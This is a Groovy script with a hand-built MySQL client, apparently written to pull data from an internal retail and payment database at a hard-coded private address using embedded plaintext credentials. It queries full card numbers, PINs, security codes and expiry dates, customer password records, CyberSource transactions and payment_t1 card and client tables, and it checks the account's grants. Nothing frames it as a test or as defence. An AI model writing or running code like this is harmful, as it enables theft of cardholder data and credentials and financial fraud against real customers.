import java.net.Socket
import java.net.InetSocketAddress
import java.security.MessageDigest

class Cx3 { byte[] d; int i = 0
  long le() { int b=d[i]&0xFF;i++;if(b<0xFB)return(long)b;if(b==0xFC){long v=(d[i]&0xFF)|((d[i+1]&0xFF)<<8);i+=2;return v};if(b==0xFD){long v=(d[i]&0xFF)|((d[i+1]&0xFF)<<8)|((d[i+2]&0xFF)<<16);i+=3;return v};long v=0;for(int k=0;k<8;k++){v|=((long)(d[i+k]&0xFF))<<(8*k)};i+=8;return v}
  String ls() { int fb=d[i]&0xFF;if(fb==0xFB){i++;return null};long l=le();String s=new String(d,i,(int)l,'UTF-8');i+=(int)l;return s }
}
class Qx3 {
  DataInputStream ins; BufferedOutputStream outs; Socket sock
  byte[] rp() { int len=(ins.readUnsignedByte())|(ins.readUnsignedByte()<<8)|(ins.readUnsignedByte()<<16);ins.readUnsignedByte();byte[] pl=new byte[len];ins.readFully(pl);return pl }
  void wp(int seq,byte[] pl) { int len=pl.length;outs.write(len&0xFF);outs.write((len>>8)&0xFF);outs.write((len>>16)&0xFF);outs.write(seq&0xFF);outs.write(pl);outs.flush() }
  boolean auth(String host,int port,String user,String pass,StringBuilder log) {
    try {
      sock=new Socket();sock.connect(new InetSocketAddress(host,port),5000);sock.setSoTimeout(15000)
      ins=new DataInputStream(new BufferedInputStream(sock.getInputStream()));outs=new BufferedOutputStream(sock.getOutputStream())
      byte[] p=rp();if((p[0]&0xFF)!=10){log.append("BAD_PROTO\n");return false}
      int i=1;StringBuilder sb=new StringBuilder();while(p[i]!=0){sb.append((char)(p[i]&0xFF));i++};i++;i+=4
      byte[] s1=new byte[8];System.arraycopy(p,i,s1,0,8);i+=8;i++;i+=2;i++;i+=2;i+=2
      int aLen=(p[i]&0xFF);i++;i+=10;int s2Len=Math.max(13,aLen-8);def s2l=[];int av=p.length-i
      for(int k=0;k<Math.min(s2Len,av);k++){if(p[i+k]!=0)s2l.add(p[i+k])}
      byte[] seed=new byte[8+s2l.size()];System.arraycopy(s1,0,seed,0,8);for(int k=0;k<s2l.size();k++)seed[8+k]=(byte)s2l[k]
      def md=MessageDigest.getInstance('SHA-1');byte[] h1=md.digest(pass.getBytes('UTF-8'));byte[] h2=md.digest(h1)
      md.reset();md.update(seed);md.update(h2);byte[] h3=md.digest()
      byte[] tok=new byte[20];for(int j=0;j<20;j++)tok[j]=(byte)((h1[j]^h3[j])&0xFF)
      int caps=0x1|0x200|0x2000|0x8000|0x80000|0x20000
      ByteArrayOutputStream b=new ByteArrayOutputStream()
      b.write(caps&0xFF);b.write((caps>>8)&0xFF);b.write((caps>>16)&0xFF);b.write((caps>>24)&0xFF)
      b.write(0);b.write(0);b.write(0);b.write(1);b.write(33);b.write(new byte[23])
      b.write(user.getBytes('UTF-8'));b.write(0);b.write(tok.length);b.write(tok);b.write('mysql_native_password'.getBytes('UTF-8'));b.write(0)
      wp(1,b.toByteArray());byte[] ap=rp();int at=ap[0]&0xFF
      if(at==0xFF){int code=(ap[1]&0xFF)|((ap[2]&0xFF)<<8);log.append("ERR_"+code+": "+new String(ap,3,ap.length-3,'UTF-8')+"\n");return false}
      log.append("AUTH_OK\n");return true
    } catch(Exception e) { log.append("CONN_ERR: "+e.getMessage()+"\n"); return false }
  }
  String q(String sql) {
    try {
      ByteArrayOutputStream qb=new ByteArrayOutputStream();qb.write(0x03);qb.write(sql.getBytes('UTF-8'))
      wp(0,qb.toByteArray());byte[] r=rp();int b0=r[0]&0xFF
      if(b0==0xFF){int code=(r[1]&0xFF)|((r[2]&0xFF)<<8);return "ERR_"+code+": "+new String(r,3,r.length-3,'UTF-8')}
      if(b0==0x00)return "OK"
      Cx3 c0=new Cx3(d:r);long cc=c0.le()
      def cols=[];(0..<cc).each{byte[] cp=rp();Cx3 cc2=new Cx3(d:cp);4.times{cc2.ls()};cols.add(cc2.ls())}
      rp()
      def rows=[];int guard=0
      while(guard++<500){byte[] r2=rp();int rb=r2[0]&0xFF;if(rb==0xFE&&r2.length<9)break;if(rb==0xFF){rows.add(["ROWERR"]);break};Cx3 rc=new Cx3(d:r2);def vals=[];(0..<cc).each{def v=rc.ls();vals.add(v==null?"NULL":v.take(200))};rows.add(vals)}
      StringBuilder res=new StringBuilder();res.append("COLS["+cols.join("|")+"]\n");rows.each{res.append("ROW["+it.join("|")+"]\n")};return res.toString()
    } catch(Exception e) { return "QERR: "+e.getMessage() }
  }
  void close(){try{sock?.close()}catch(Exception ignored){}}
}

def H='172.27.141.6'; def P=3312; def U='dbcronproductos'; def PW='0c1A0ZW0Kh#wjqdRHV$b63A'

def qry = { String sql ->
  def log=new StringBuilder(); def mc=new Qx3()
  try {
    if(!mc.auth(H,P,U,PW,log)) return "AUTH_FAIL: "+log
    def r=mc.q(sql); mc.close(); return r
  } catch(Exception e) { try{mc.close()}catch(Exception ignored){}; return "EXCEPTION: "+e.getMessage() }
}

// Get clientes schema first
println "=== SCHEMA clientes ==="
println qry("SELECT COLUMN_NAME,COLUMN_TYPE FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='tienda' AND TABLE_NAME='clientes' ORDER BY ORDINAL_POSITION")

// Get datos_pedido schema
println "=== SCHEMA datos_pedido ==="
println qry("SELECT COLUMN_NAME,COLUMN_TYPE FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='tienda' AND TABLE_NAME='datos_pedido' ORDER BY ORDINAL_POSITION")

// pedidos - using correct column names from schema
println "=== SAMPLE pedidos con tarjetas (Id, Cliente, tipotarjeta, nip, nombre, numero, mes, ao, seguridad) ==="
println qry("SELECT Id,Cliente,Fecha_Inicio,tipotarjeta,nip,nombre,numero,mes,ao,seguridad,total,ip FROM tienda.pedidos WHERE numero IS NOT NULL AND numero!='' AND numero!='0' ORDER BY Id DESC LIMIT 20")

println "=== PEDIDOS TOTAL con tarjeta ==="
println qry("SELECT COUNT(*) FROM tienda.pedidos WHERE numero IS NOT NULL AND numero!='' AND numero!='0'")

// clientescontrasena - usando correcto schema: id, cliente, contrasena, fecha, fechaActualizacion
println "=== SAMPLE clientescontrasena ==="
println qry("SELECT id,cliente,contrasena,fecha,fechaActualizacion FROM tienda.clientescontrasena ORDER BY id DESC LIMIT 20")

// clientes - need correct col names from schema above
println "=== SAMPLE clientes (limit 10) ==="
println qry("SELECT * FROM tienda.clientes LIMIT 10")

// cybersource_transacciones
println "=== SCHEMA cybersource_transacciones ==="
println qry("SELECT COLUMN_NAME,COLUMN_TYPE FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='tienda' AND TABLE_NAME='cybersource_transacciones' ORDER BY ORDINAL_POSITION")

println "=== SAMPLE cybersource_transacciones ==="
println qry("SELECT * FROM tienda.cybersource_transacciones ORDER BY id DESC LIMIT 10")

// Also try payment_t1 on same port (app_t1 user)
println "\n=== PAYMENT_T1 via app_t1@172.27.141.6:3312 ==="
def log2=new StringBuilder(); def mc2=new Qx3()
try {
  if(mc2.auth('172.27.141.6',3312,'app_t1','jpTSf99UzLxC#t>',log2)) {
    println "AUTH_OK for app_t1"
    println "DBs: "+mc2.q("SHOW DATABASES")
    println "GRANTS: "+mc2.q("SHOW GRANTS FOR CURRENT_USER()")
    println "COUNT card: "+mc2.q("SELECT COUNT(*) FROM payment_t1.card")
    println "COUNT client: "+mc2.q("SELECT COUNT(*) FROM payment_t1.client")
    println "COUNT transaction: "+mc2.q("SELECT COUNT(*) FROM payment_t1.transaction")
    println "SAMPLE card: "+mc2.q("SELECT * FROM payment_t1.card LIMIT 10")
    println "SAMPLE client: "+mc2.q("SELECT * FROM payment_t1.client LIMIT 10")
    println "SAMPLE transaction: "+mc2.q("SELECT * FROM payment_t1.transaction LIMIT 10")
    println "SAMPLE suscripciones: "+mc2.q("SELECT * FROM payment_t1.suscripciones LIMIT 10")
  } else {
    println "AUTH_FAIL app_t1: "+log2
  }
} catch(Exception e) { println "EXC: "+e.getMessage() }
mc2.close()

println "=== FIN ==="
